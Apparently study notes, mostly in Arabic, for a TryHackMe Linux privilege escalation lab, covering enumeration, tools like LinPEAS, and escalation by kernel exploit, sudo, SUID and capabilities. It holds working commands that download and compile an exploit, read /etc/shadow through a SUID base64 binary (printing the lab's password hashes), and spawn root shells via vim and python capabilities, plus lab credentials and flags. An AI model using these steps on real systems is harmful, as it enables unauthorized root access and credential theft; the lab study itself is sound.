# Linux Privilege Escalation

![image](https://github.com/user-attachments/assets/7d5663ba-af28-421d-823d-67a0c93c8b7f)

<details>
  <summary>Enumeration</summary>


```
Username: karen

Password: Password1
```

  

## 1. Basic Info (معلومات عامة عن النظام)

| أمر        | وظيفته                                                    |
| ---------- | --------------------------------------------------------- |
| `whoami`   | يعرفك اسم المستخدم اللي انت عليه حاليًا                   |
| `id`       | يوضح الـ UID/GID والصلاحيات المرتبطة بيك                  |
| `hostname` | اسم الجهاز – أحيانًا مفيد لو الجهاز له اسم يدل على وظيفته |
| `uname -a` | إصدار الكرنل + المعمارية (x86\_64 أو غيره)                |

![image](https://github.com/user-attachments/assets/6363ac11-bf41-4ae1-9b7d-b9c42e67e1fc)


---

## 2. OS Version & Kernel

| أمر                   | وظيفته                                                                        |
| --------------------- | ----------------------------------------------------------------------------- |
| `cat /etc/issue`      | يطبع اسم وتفاصيل الـ Linux distro (مثلاً Ubuntu 20.04)                        |
| `cat /etc/os-release` | ملف رسمي فيه اسم النسخة + ID + Version                                        |
| `cat /proc/version`   | معلومات عن الكرنل + إذا كان GCC موجود (مهم لو عايز تـ compile local exploits) |



---

## 3. Environment

| أمر          | وظيفته                                                                                            |
| ------------ | ------------------------------------------------------------------------------------------------- |
| `env`        | يطبع كل المتغيرات البيئية، ممكن تلاقي فيها tokens أو مسارات غريبة                                 |
| `echo $PATH` | بيعرفك المسارات اللي النظام بيشوف فيها الملفات القابلة للتنفيذ – مهم جدًا لو فيه مسار قابل للحقن! |


![image](https://github.com/user-attachments/assets/aab5ff77-0ab8-4a6a-b7c5-db330f0e8a2f)

---

## 4. Users and Groups

| أمر               | وظيفته                                                                 |
| ----------------- | ---------------------------------------------------------------------- |
| `cat /etc/passwd` | يطبع كل المستخدمين الموجودين على النظام                                |
| `cat /etc/group`  | يشوف المجموعات اللي موجودة واللي ممكن تكون حساسة (مثلاً: docker، sudo) |

![image](https://github.com/user-attachments/assets/7b0e7204-dc60-4b97-981c-040c90fd6ccf)

![image](https://github.com/user-attachments/assets/ed5096cb-2831-45c1-a506-52bf1271e7f2)


---


## 5. Crontab / Scheduled Jobs

| أمر                 | وظيفته                                                                    |
| ------------------- | ------------------------------------------------------------------------- |
| `crontab -l`        | المهام المجدولة للمستخدم الحالي                                           |
| `ls -la /etc/cron*` | يشوف كل ملفات الـ crontab في النظام – أحيانًا تلاقي سكريبت بيتنفذ بـ root |
| `cat /etc/crontab`  | المهام المجدولة للنظام ككل – ممكن تديك وسيلة للاستغلال                    |



---

## 6. Processes & Services

| أمر                             | وظيفته                                                                   |
| ------------------------------- | ------------------------------------------------------------------------ |
| `ps aux`                        | يعرض كل العمليات الجارية – ممكن تلاقي برنامج بيشغله root                 |
| `top` أو `htop`                 | مشاهدة تفاعلية للعمليات                                                  |
| `netstat -tulnp` أو `ss -tulnp` | الخدمات اللي شغالة على البورتات – ممكن تلاقي حاجة داخليًا بس (localhost) |


![image](https://github.com/user-attachments/assets/16f4a91d-8133-481a-b79a-eb75ecbcb0f5)


![image](https://github.com/user-attachments/assets/e919e12d-1c12-405b-81cc-2d4a55b83133)
![image](https://github.com/user-attachments/assets/ec996032-2bf8-411f-8b80-590ed7b4e971)

![image](https://github.com/user-attachments/assets/03193a5c-21cf-4abe-b00a-616bb3e026f8)

![image](https://github.com/user-attachments/assets/a8f6abd4-62c9-4fe1-a78d-942b6929c021)

---

## 7. File System Permissions

| أمر                                     | وظيفته                                                                   |
| --------------------------------------- | ------------------------------------------------------------------------ |
| `find / -perm -4000 2>/dev/null`        | يبحث عن ملفات SUID – ملفات بتشتغل بصلاحيات المالك، ممكن تديك root access |
| `find / -perm -u=s -type f 2>/dev/null` | بديل للبحث عن SUID executables                                           |
| `find / -writable -type d 2>/dev/null`  | مجلدات قابلة للكتابة – ممكن تعمل فيها استغلال                            |


![image](https://github.com/user-attachments/assets/5c13b75e-a6c9-4e51-aa7d-0702d534d47c)

![image](https://github.com/user-attachments/assets/fde332e2-f181-44c0-b326-8f0c9150e57a)

![image](https://github.com/user-attachments/assets/4a89aa31-9be3-4e87-85df-0d1ec5ad4710)



---







## ✅ ملخص سريع :

| المحور           | الهدف                                         |
| ---------------- | --------------------------------------------- |
| OS & Kernel Info | تشوف لو في ثغرات على النسخة دي                |
| Environment      | PATH وقيم مهمة ممكن تسبب استغلال              |
| Users & Groups   | هل انت في مجموعة حساسة؟                       |
| Cron Jobs        | هل في سكريبت بيشتغل بوقت محدد ممكن تعدله؟     |
| Processes        | هل في برامج بتشتغل بصلاحيات أعلى؟             |
| SUID Files       | ممكن تستغل ملف بـ SUID عشان تاخد صلاحيات أعلى |






---
---





![image](https://github.com/user-attachments/assets/b8d06c67-4553-4990-ad30-9034da8eaf34)






  
</details>


















<details>
  <summary>Automated Enumeration Tools</summary>

# 🔐 Linux Privilege Escalation Enumeration Tools

قائمة بأهم الأدوات المفتوحة المصدر التي تُستخدم لتجميع معلومات النظام (Enumeration) من أجل اكتشاف فرص للترقية إلى صلاحيات أعلى (Root).

---

## 🥇 1. [LinPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

- 🔎 من أقوى الأدوات الآلية لتجميع كل شيء تقريبًا.
- تبحث عن:
  - صلاحيات خاطئة في الملفات
  - SUID/SGID binaries
  - ملفات cron
  - كلمات مرور مكشوفة
  - خدمات مشغلة بصلاحيات عالية
- 🧠 تحتوي على خوارزميات للكشف عن misconfigurations والفرص الواضحة للاستغلال.
- ✅ مناسبة للأنظمة الحديثة والمتنوعة.

---

## 🥈 2. [LinEnum](https://github.com/rebootuser/LinEnum)

- 📜 سكربت Bash تقليدي لكن شامل.
- يقوم بجمع معلومات مثل:
  - بيانات النظام والمستخدم
  - cron jobs
  - network config
  - ملفات SUID/SGID
- 💡 أقل تفاعلية من LinPEAS، لكنه خفيف وسهل التشغيل.
- مفيد في حالات محدودة الموارد.

---

## 🥉 3. [LES - Linux Exploit Suggester](https://github.com/mzet-/linux-exploit-suggester)

- 🔍 يحلل إصدار الكرنل ويقترح عليك Exploits معروفة.
- مش بيعمل Enumeration كامل، لكنه:
  - يقارن الكرنل الحالي بقاعدة بيانات فيها Exploits قديمة
  - يعطيك توصيات مباشرة
- مناسب بعد معرفة إصدار الكرنل من `uname -a`.

---

## 4. [Linux Smart Enumeration (LSE)](https://github.com/diego-treitos/linux-smart-enumeration)

- 🧠 أداة ذكية تعمل بـ 3 أوضاع:
  - Quick
  - Standard
  - Thorough
- تعرض النتائج بتنسيق واضح وسهل الفهم.
- مصممة لتكون "هادئة" – لا تترك أثر واضح في النظام.
- مفيدة للاختبارات الهادئة (Low OPSEC).

---

## 5. [Linux Priv Checker](https://github.com/linted/linuxprivchecker)

- 📘 سكربت Python قديم نسبيًا لكنه مفيد.
- يعطيك ملخص لبيئة التشغيل، الصلاحيات، الملفات الغريبة.
- مناسب مع الأنظمة القديمة أو أنظمة Python-only.

---

## 🧰 ملاحظات عامة:

| أداة | نوعها | الأفضل لـ |
|------|--------|------------|
| LinPEAS | شامل + ذكي | اكتشاف فرص متعددة + تحليل شامل |
| LinEnum | بسيط + مباشر | بيئة محدودة أو سكربت سريع |
| LES | اقتراح Exploits فقط | بعد معرفة kernel |
| LSE | ذكي + منظم | الاختبارات الدقيقة بدون ضوضاء |
| LinuxPrivChecker | خفيف + Python | بيئات قديمة أو محدودة |

---

> 💡 **نصيحة:** الأفضل دائمًا تبدأ بـ LinPEAS أو LSE، وبعد كده تستخدم LES لو فيه فرصة لاستغلال الكرنل.


  
</details>

























<details>
  <summary>Privilege Escalation: Kernel Exploits</summary>


# 🚀 Linux Privilege Escalation – Kernel Exploits

## 🎯 الهدف
استغلال ثغرات في نواة النظام (Kernel) للترقية من مستخدم عادي إلى root.

---

## 🧾 1. تحديد إصدار الكرنل

```bash
uname -r
```

مثال إخراج:
```
3.13.0-24-generic
```

---

## 🔍 2. البحث عن ثغرات مناسبة

### أدوات مساعدة:
- [LES (Linux Exploit Suggester)](https://github.com/mzet-/linux-exploit-suggester)
- [Exploit-DB](https://www.exploit-db.com)
- `searchsploit` (لو مثبت عندك)

### مثال باستخدام LES:
```bash
wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh
chmod +x linux-exploit-suggester.sh
./linux-exploit-suggester.sh
```

---

## 🛠️ 3. تجربة Exploit

### خطوات عامة:

1. تحميل الكود:
```bash
wget https://www.exploit-db.com/raw/37292 -O exploit.c
```

2. تجميع (Compile):
```bash
gcc exploit.c -o exploit
```

3. تشغيل:
```bash
./exploit
```

4. التحقق من الصلاحيات:
```bash
whoami
id
```

---

## ⚠️ ملاحظات مهمة

| نقطة | توضيح |
|------|--------|
| ❗ Compiler (مثل gcc) لازم يكون متاح | لو مش موجود، compile من جهازك وانقل الملف |
| ⚙️ بعض الثغرات مش بتشتغل دايمًا | جرب أكثر من exploit |
| 📛 Kernel Exploits خطيرة | ممكن تسبب system crash أو shell غير مستقرة |
| 🧠 استخدم Virtual Machine أو اختبار فقط | لتفادي تلف النظام |

---

## ✅ خطوات التلخيص

| الخطوة | الأداة |
|--------|--------|
| تحديد إصدار الكرنل | `uname -r` |
| اقتراح ثغرات | LES، Exploit-DB، searchsploit |
| تحميل واستغلال | `wget`, `gcc`, `./exploit` |
| التأكد من النجاح | `whoami`, `id` |

---

> 💡 **نصيحة:** دائمًا احتفظ بمجموعة Exploits جاهزة، واختبرها في بيئة آمنة فقط.





---
---

![image](https://github.com/user-attachments/assets/390d0b3e-a279-4b22-bfd2-df265e05b60e)

![image](https://github.com/user-attachments/assets/3945f3af-cdf2-4342-9412-7dc108059dd7)

```
cd /tmp
wget https://www.exploit-db.com/raw/37292 -O exploit.c
```

```
gcc exploit.c -o exploit
./exploit
```

![image](https://github.com/user-attachments/assets/30b5b5b8-31da-4537-b1cc-626f6dc91fca)


```
THM-28392872729920
```


  
</details>











<details>
  <summary>Privilege Escalation: Sudo</summary>



![image](https://github.com/user-attachments/assets/c9d1a10a-e3ae-4ac8-8640-3ca05260682b)


![image](https://github.com/user-attachments/assets/6fd0efaf-d307-409a-b924-24b7c0ac4202)


```
sudo nano /etc/shadow
```

![image](https://github.com/user-attachments/assets/1cba0943-d5e7-4d27-a43c-070ddf5c5eb1)






  
</details>






<details>
  <summary>Privilege Escalation: SUID</summary>


list files that have SUID or SGID 

```
find / -type f -perm -04000 -ls 2>/dev/null
```

```ruby
       66     40 -rwsr-xr-x   1 root     root        40152 Jan 27  2020 /snap/core/10185/bin/mount
       80     44 -rwsr-xr-x   1 root     root        44168 May  7  2014 /snap/core/10185/bin/ping
       81     44 -rwsr-xr-x   1 root     root        44680 May  7  2014 /snap/core/10185/bin/ping6
       98     40 -rwsr-xr-x   1 root     root        40128 Mar 25  2019 /snap/core/10185/bin/su
      116     27 -rwsr-xr-x   1 root     root        27608 Jan 27  2020 /snap/core/10185/bin/umount
     2610     71 -rwsr-xr-x   1 root     root        71824 Mar 25  2019 /snap/core/10185/usr/bin/chfn
     2612     40 -rwsr-xr-x   1 root     root        40432 Mar 25  2019 /snap/core/10185/usr/bin/chsh
     2689     74 -rwsr-xr-x   1 root     root        75304 Mar 25  2019 /snap/core/10185/usr/bin/gpasswd
     2781     39 -rwsr-xr-x   1 root     root        39904 Mar 25  2019 /snap/core/10185/usr/bin/newgrp
     2794     53 -rwsr-xr-x   1 root     root        54256 Mar 25  2019 /snap/core/10185/usr/bin/passwd
     2904    134 -rwsr-xr-x   1 root     root       136808 Jan 31  2020 /snap/core/10185/usr/bin/sudo
     3003     42 -rwsr-xr--   1 root     systemd-resolve    42992 Jun 11  2020 /snap/core/10185/usr/lib/dbus-1.0/dbus-daemon-launch-helper
     3375    419 -rwsr-xr-x   1 root     root              428240 May 26  2020 /snap/core/10185/usr/lib/openssh/ssh-keysign
     6437    109 -rwsr-xr-x   1 root     root              110792 Oct  8  2020 /snap/core/10185/usr/lib/snapd/snap-confine
     7615    386 -rwsr-xr--   1 root     dip               394984 Jul 23  2020 /snap/core/10185/usr/sbin/pppd
       56     43 -rwsr-xr-x   1 root     root               43088 Mar  5  2020 /snap/core18/1885/bin/mount
       65     63 -rwsr-xr-x   1 root     root               64424 Jun 28  2019 /snap/core18/1885/bin/ping
       81     44 -rwsr-xr-x   1 root     root               44664 Mar 22  2019 /snap/core18/1885/bin/su
       99     27 -rwsr-xr-x   1 root     root               26696 Mar  5  2020 /snap/core18/1885/bin/umount
     1698     75 -rwsr-xr-x   1 root     root               76496 Mar 22  2019 /snap/core18/1885/usr/bin/chfn
     1700     44 -rwsr-xr-x   1 root     root               44528 Mar 22  2019 /snap/core18/1885/usr/bin/chsh
     1752     75 -rwsr-xr-x   1 root     root               75824 Mar 22  2019 /snap/core18/1885/usr/bin/gpasswd
     1816     40 -rwsr-xr-x   1 root     root               40344 Mar 22  2019 /snap/core18/1885/usr/bin/newgrp
     1828     59 -rwsr-xr-x   1 root     root               59640 Mar 22  2019 /snap/core18/1885/usr/bin/passwd
     1919    146 -rwsr-xr-x   1 root     root              149080 Jan 31  2020 /snap/core18/1885/usr/bin/sudo
     2006     42 -rwsr-xr--   1 root     systemd-resolve    42992 Jun 11  2020 /snap/core18/1885/usr/lib/dbus-1.0/dbus-daemon-launch-helper
     2314    427 -rwsr-xr-x   1 root     root              436552 Mar  4  2019 /snap/core18/1885/usr/lib/openssh/ssh-keysign
     7477     52 -rwsr-xr--   1 root     messagebus         51344 Jun 11  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
    13816    464 -rwsr-xr-x   1 root     root              473576 May 29  2020 /usr/lib/openssh/ssh-keysign
    13661     24 -rwsr-xr-x   1 root     root               22840 Aug 16  2019 /usr/lib/policykit-1/polkit-agent-helper-1
     7479     16 -rwsr-xr-x   1 root     root               14488 Jul  8  2019 /usr/lib/eject/dmcrypt-get-device
    13676    128 -rwsr-xr-x   1 root     root              130152 Oct  8  2020 /usr/lib/snapd/snap-confine
     1856     84 -rwsr-xr-x   1 root     root               85064 May 28  2020 /usr/bin/chfn
     2300     32 -rwsr-xr-x   1 root     root               31032 Aug 16  2019 /usr/bin/pkexec
     1816    164 -rwsr-xr-x   1 root     root              166056 Jul 15  2020 /usr/bin/sudo
     1634     40 -rwsr-xr-x   1 root     root               39144 Jul 21  2020 /usr/bin/umount
     1860     68 -rwsr-xr-x   1 root     root               68208 May 28  2020 /usr/bin/passwd
     1859     88 -rwsr-xr-x   1 root     root               88464 May 28  2020 /usr/bin/gpasswd
     1507     44 -rwsr-xr-x   1 root     root               44784 May 28  2020 /usr/bin/newgrp
     1857     52 -rwsr-xr-x   1 root     root               53040 May 28  2020 /usr/bin/chsh
     1722     44 -rwsr-xr-x   1 root     root               43352 Sep  5  2019 /usr/bin/base64
     1674     68 -rwsr-xr-x   1 root     root               67816 Jul 21  2020 /usr/bin/su
     2028     40 -rwsr-xr-x   1 root     root               39144 Mar  7  2020 /usr/bin/fusermount
     2166     56 -rwsr-sr-x   1 daemon   daemon             55560 Nov 12  2018 /usr/bin/at
     1633     56 -rwsr-xr-x   1 root     root               55528 Jul 21  2020 /usr/bin/mount
```


```css
     1722     44 -rwsr-xr-x   1 root     root               43352 Sep  5  2019 /usr/bin/base64
```

![image](https://github.com/user-attachments/assets/bf1a3ca9-f1c0-48b9-aff8-beefdd03286a)


```
LFILE=/etc/shadow
```

now read the file:


```
/usr/bin/base64 "$LFILE"
```

``output``

```
cm9vdDoqOjE4NTYxOjA6OTk5OTk6Nzo6OgpkYWVtb246KjoxODU2MTowOjk5OTk5Ojc6OjoKYmlu
Oio6MTg1NjE6MDo5OTk5OTo3Ojo6CnN5czoqOjE4NTYxOjA6OTk5OTk6Nzo6OgpzeW5jOio6MTg1
NjE6MDo5OTk5OTo3Ojo6CmdhbWVzOio6MTg1NjE6MDo5OTk5OTo3Ojo6Cm1hbjoqOjE4NTYxOjA6
OTk5OTk6Nzo6OgpscDoqOjE4NTYxOjA6OTk5OTk6Nzo6OgptYWlsOio6MTg1NjE6MDo5OTk5OTo3
Ojo6Cm5ld3M6KjoxODU2MTowOjk5OTk5Ojc6OjoKdXVjcDoqOjE4NTYxOjA6OTk5OTk6Nzo6Ogpw
cm94eToqOjE4NTYxOjA6OTk5OTk6Nzo6Ogp3d3ctZGF0YToqOjE4NTYxOjA6OTk5OTk6Nzo6Ogpi
YWNrdXA6KjoxODU2MTowOjk5OTk5Ojc6OjoKbGlzdDoqOjE4NTYxOjA6OTk5OTk6Nzo6OgppcmM6
KjoxODU2MTowOjk5OTk5Ojc6OjoKZ25hdHM6KjoxODU2MTowOjk5OTk5Ojc6OjoKbm9ib2R5Oio6
MTg1NjE6MDo5OTk5OTo3Ojo6CnN5c3RlbWQtbmV0d29yazoqOjE4NTYxOjA6OTk5OTk6Nzo6Ogpz
eXN0ZW1kLXJlc29sdmU6KjoxODU2MTowOjk5OTk5Ojc6OjoKc3lzdGVtZC10aW1lc3luYzoqOjE4
NTYxOjA6OTk5OTk6Nzo6OgptZXNzYWdlYnVzOio6MTg1NjE6MDo5OTk5OTo3Ojo6CnN5c2xvZzoq
OjE4NTYxOjA6OTk5OTk6Nzo6OgpfYXB0Oio6MTg1NjE6MDo5OTk5OTo3Ojo6CnRzczoqOjE4NTYx
OjA6OTk5OTk6Nzo6Ogp1dWlkZDoqOjE4NTYxOjA6OTk5OTk6Nzo6Ogp0Y3BkdW1wOio6MTg1NjE6
MDo5OTk5OTo3Ojo6CnNzaGQ6KjoxODU2MTowOjk5OTk5Ojc6OjoKbGFuZHNjYXBlOio6MTg1NjE6
MDo5OTk5OTo3Ojo6CnBvbGxpbmF0ZToqOjE4NTYxOjA6OTk5OTk6Nzo6OgplYzItaW5zdGFuY2Ut
Y29ubmVjdDohOjE4NTYxOjA6OTk5OTk6Nzo6OgpzeXN0ZW1kLWNvcmVkdW1wOiEhOjE4Nzk2Ojo6
Ojo6CnVidW50dTohOjE4Nzk2OjA6OTk5OTk6Nzo6OgpnZXJyeWNvbndheTokNiR2Z3pneE0zeWJU
bEIud2tWJDQ4WURZN3FRbnA0cHVyT0oxOW14Zk1Pd0t0LkgyTGFXS1B1MHpLbFdLYVVNRzFON3dl
Vnpxb2JwNjVSeGxNSVovTmlyeGVaZE9KTUVPcDNvZkUuUlQvOjE4Nzk2OjA6OTk5OTk6Nzo6Ogp1
c2VyMjokNiRtNlZtektUYnpDRC8uSTEwJGNLT3ZaWjgvcnNZd0hkLnBFMDk5WlJ3TTY4NnAvRXAx
M2g3cEZNQkNHNHQ3SXVrUnFjL2ZYbEExZ0hYaDlGMkNid21ENEVwaTFXZ2guQ2wuVlYxbWIvOjE4
Nzk2OjA6OTk5OTk6Nzo6OgpseGQ6IToxODc5Njo6Ojo6OgprYXJlbjokNiRWamNyS3ovNlM4cmhW
NEk3JHlib1RiME1FeHFwTVhXMGhqRUpncUxXcy9qR1BKQTdOL2ZFb1BNdVlMWTF3MTZGd0w3RUND
YlFXSnFZTEdweS5ac2NuYTlHSUxDU2FOTEpkQlAxcDgvOjE4Nzk2OjA6OTk5OTk6Nzo6Ogo=
```

it return ``/etc/shadow`` but encoded 

```
/usr/bin/base64 "$LFILE" | base64 --decode
```

`output`

```
root:*:18561:0:99999:7:::
daemon:*:18561:0:99999:7:::
bin:*:18561:0:99999:7:::
sys:*:18561:0:99999:7:::
sync:*:18561:0:99999:7:::
games:*:18561:0:99999:7:::
man:*:18561:0:99999:7:::
lp:*:18561:0:99999:7:::
mail:*:18561:0:99999:7:::
news:*:18561:0:99999:7:::
uucp:*:18561:0:99999:7:::
proxy:*:18561:0:99999:7:::
www-data:*:18561:0:99999:7:::
backup:*:18561:0:99999:7:::
list:*:18561:0:99999:7:::
irc:*:18561:0:99999:7:::
gnats:*:18561:0:99999:7:::
nobody:*:18561:0:99999:7:::
systemd-network:*:18561:0:99999:7:::
systemd-resolve:*:18561:0:99999:7:::
systemd-timesync:*:18561:0:99999:7:::
messagebus:*:18561:0:99999:7:::
syslog:*:18561:0:99999:7:::
_apt:*:18561:0:99999:7:::
tss:*:18561:0:99999:7:::
uuidd:*:18561:0:99999:7:::
tcpdump:*:18561:0:99999:7:::
sshd:*:18561:0:99999:7:::
landscape:*:18561:0:99999:7:::
pollinate:*:18561:0:99999:7:::
ec2-instance-connect:!:18561:0:99999:7:::
systemd-coredump:!!:18796::::::
ubuntu:!:18796:0:99999:7:::
gerryconway:$6$vgzgxM3ybTlB.wkV$48YDY7qQnp4purOJ19mxfMOwKt.H2LaWKPu0zKlWKaUMG1N7weVzqobp65RxlMIZ/NirxeZdOJMEOp3ofE.RT/:18796:0:99999:7:::
user2:$6$m6VmzKTbzCD/.I10$cKOvZZ8/rsYwHd.pE099ZRwM686p/Ep13h7pFMBCG4t7IukRqc/fXlA1gHXh9F2CbwmD4Epi1Wgh.Cl.VV1mb/:18796:0:99999:7:::
lxd:!:18796::::::
karen:$6$VjcrKz/6S8rhV4I7$yboTb0MExqpMXW0hjEJgqLWs/jGPJA7N/fEoPMuYLY1w16FwL7ECCbQWJqYLGpy.Zscna9GILCSaNLJdBP1p8/:18796:0:99999:7:::
```

``user2`` hash

```
$6$m6VmzKTbzCD/.I10$cKOvZZ8/rsYwHd.pE099ZRwM686p/Ep13h7pFMBCG4t7IukRqc/fXlA1gHXh9F2CbwmD4Epi1Wgh.Cl.VV1mb/
```

![image](https://github.com/user-attachments/assets/20bd2e82-a055-4cb4-ba9c-70dad84c7076)

using same way to read ``flag3.txt``

```
LFILE=/home/ubuntu/flag3.txt
/usr/bin/base64 "$LFILE" | base64 --decode
```

![image](https://github.com/user-attachments/assets/284627cd-cc2d-483b-8f0d-f3c420f4b2a7)

```
THM-3847834
```

  
</details>






<details>
  <summary>Privilege Escalation: Capabilities</summary>


# 🔐 Linux Capabilities & Privilege Escalation

## 🧠 ما هي Linux Capabilities؟

في أنظمة لينكس الحديثة، يمكن منح **صلاحيات جزئية** للبرامج بدون الحاجة لتشغيلها بصلاحيات `root`.  
هذه الصلاحيات تُعرف باسم: **Capabilities**

مثال:
- `cap_net_raw` → يسمح بفتح raw sockets (مفيد لأدوات الشبكة)
- `cap_dac_read_search` → يسمح بقراءة ملفات بدون صلاحية قراءة

---

## 🎯 الهدف في الـ Privilege Escalation

نبحث عن برامج تمتلك Capabilities قوية يمكن استغلالها للوصول إلى صلاحيات `root`.

---

## 🔍 كيف نبحث عن الملفات ذات Capabilities؟

استخدم الأمر التالي من مستخدم عادي:

```bash
getcap -r / 2>/dev/null
```

- `-r /` → يبحث بشكل تكراري في كل النظام
- `2>/dev/null` → يتجاهل رسائل الخطأ

---

## 💡 ملاحظات هامة:

| النوع         | أداة الكشف        |
|--------------|------------------|
| SUID         | `find`           |
| Capabilities | `getcap`         |

> Capabilities لا تظهر في فحص الـ SUID، لذلك تحتاج لفحص خاص.

---

## 🧰 GTFObins — أداة ممتازة للاستغلال

موقع GTFObins يحتوي على قائمة ببرامج يمكن استغلالها:

🔗 [https://gtfobins.github.io](https://gtfobins.github.io)

ابحث عن أي برنامج (مثل `vim`, `perl`, `python`, `tar`) وتحقق إذا كان له استغلال تحت قسم **Capabilities**.

---

## 🧪 مثال عملي: استغلال vim بوجود Capability

### 1. تحقق من وجود capability على vim:

```bash
/usr/bin/vim = cap_setuid+ep
```

### 2. شغّل vim مع أمر تنفيذ داخلي:

```bash
vim -c ':!sh'
```

### 3. تحقق من الصلاحيات:

```bash
id
# uid=0(root) gid=0(root)
```

✅ مبروك! حصلت على shell بصلاحيات root.

---

## ✅ ملخص سريع

| العنصر              | الشرح |
|---------------------|-------|
| Capabilities         | صلاحيات جزئية تُمنح للبرامج بدلاً من root الكامل |
| getcap               | أداة لفحص البرامج ذات Capabilities |
| استغلال capabilities | إذا كان البرنامج يملك capability قوية، يمكن تشغيله والحصول على صلاحيات أعلى |
| GTFObins             | موقع يعرض طرق استغلال البرامج المعروفة |

---

## 🔚 الخطوة التالية

- شغّل:
```bash
getcap -r / 2>/dev/null
```

- ثم راجع النتائج وأرسل البرامج هنا لتحليل فرص التصعيد 🚀






## 🟥 Capabilities خطيرة جدًا:

| Capability            | خطورتها                                         |
| --------------------- | ----------------------------------------------- |
| `cap_setuid`          | تغيير UID (يعني ممكن يشغّل نفسه كـ root) 😈     |
| `cap_sys_admin`       | شبه صلاحيات root، كنز حقيقي 💣                  |
| `cap_dac_override`    | يتجاوز صلاحيات الملفات، ممكن يقرأ/يكتب أي ملف   |
| `cap_dac_read_search` | يقرأ أي ملف حتى لو مالكوش صلاحية عليه           |
| `cap_fowner`          | يقدر يعدل على ملفات مش بتاعته                   |
| `cap_net_raw`         | يستخدم RAW sockets، ممكن sniff أو spoof الشبكة  |
| `cap_sys_ptrace`      | ممكن يعمل Debug على عمليات تانية (وسرقة بيانات) |



## 🟡 Capabilities متوسطة الخطورة:


| Capability             | ملاحظات                                                |
| ---------------------- | ------------------------------------------------------ |
| `cap_net_bind_service` | يفتح بورت أقل من 1024 (ممكن استخدامه لتصعيد داخل خدمة) |
| `cap_chown`            | يغير مالك الملفات — مفيد في بعض السيناريوهات           |
| `cap_kill`             | يقتل أي عملية — ممكن يستخدم لإيقاف الحماية أو الخدمات  |


## 🧪 مثال عملي:

```
/usr/bin/python3.8 = cap_setuid+ep
```

ده معناه إن ``python3.8`` يقدر يغير الـ UID ويشتغل كـ root
لو شغلته كده:

```
python3.8 -c 'import os; os.setuid(0); os.system("/bin/sh")'
```

لو نجحت، هيجيلك شيل بصلاحيات root مباشرة 💥


## 🧠 مصادر تعرفك خطورة أي capability:
🔗 [man 7 capabilities](https://man7.org/linux/man-pages/man7/capabilities.7.html)

🔍 موقع GTFObins: ابحث عن اسم البرنامج وشوف لو له استغلال تحت Capabilities

🔐 أداة linpeas.sh ``→`` تعرضلك البرامج ``+`` capabilities ``+`` تقييم خطورتها



  
</details>


































